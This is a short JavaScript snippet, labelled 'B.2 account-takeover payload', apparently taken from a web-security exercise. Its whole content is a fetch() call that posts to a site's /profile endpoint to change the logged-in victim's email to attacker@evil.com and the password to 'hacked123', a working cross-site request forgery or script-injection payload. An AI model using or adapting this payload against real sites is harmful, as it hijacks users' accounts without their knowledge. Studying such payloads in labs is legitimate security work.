// B.2 account-takeover payload — changes the victim's email & password
fetch('/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=attacker@evil.com&password=hacked123'
});
